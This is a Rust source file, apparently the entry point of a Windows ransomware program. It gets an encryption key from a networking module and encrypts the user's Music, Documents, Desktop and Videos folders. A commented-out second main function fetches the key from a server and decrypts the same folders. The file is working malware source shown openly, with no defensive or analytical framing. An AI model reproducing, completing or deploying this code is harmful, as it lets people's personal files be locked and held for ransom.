mod cryptography;
mod gui;
mod networking;

use std::path::Path;
use std::path::PathBuf;
use anyhow::Result;

use cryptography::encrypt::{encrypt_folder, decrypt_folder};
use networking::client::{ get_key, gen_key };

use windows::Win32::UI::Shell::{
    SHGetKnownFolderPath,
    FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos,
    KNOWN_FOLDER_FLAG
};
use windows::core::PWSTR;

// ENCRYPTING
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // let key: [u8; 32] = *b"12345678901234567890123456789012";
    let key: [u8; 32] = gen_key().await?;

    let mut paths = [FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos];

    unsafe {
        for path in paths {
            let path_ptr: PWSTR = SHGetKnownFolderPath(&path, KNOWN_FOLDER_FLAG(0), None).unwrap();
            let path_str = path_ptr.to_string().unwrap();
            let path_buf: PathBuf = path_str.into();
            println!("path: {:?}", path_buf);


            encrypt_folder(&path_buf, &key)?;
        }
    }

    Ok(())
}

// DECRYPTING
// #[tokio::main]
// async fn main() -> Result<(), Box<dyn std::error::Error>> {
//     // let key: [u8; 32] = *b"12345678901234567890123456789012";
//     let key: [u8; 32] = get_key(&"123").await?;

//     let mut paths = [FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos];
//     println!("{:?}", key);
//     unsafe {
//         for path in paths {
//             let path_ptr: PWSTR = SHGetKnownFolderPath(&path, KNOWN_FOLDER_FLAG(0), None).unwrap();
//             let path_str = path_ptr.to_string().unwrap();
//             let path_buf: PathBuf = path_str.into();
//             println!("path: {:?}", path_buf);


//             decrypt_folder(&path_buf, &key)?;
//         }
//     }

//     Ok(())
// }
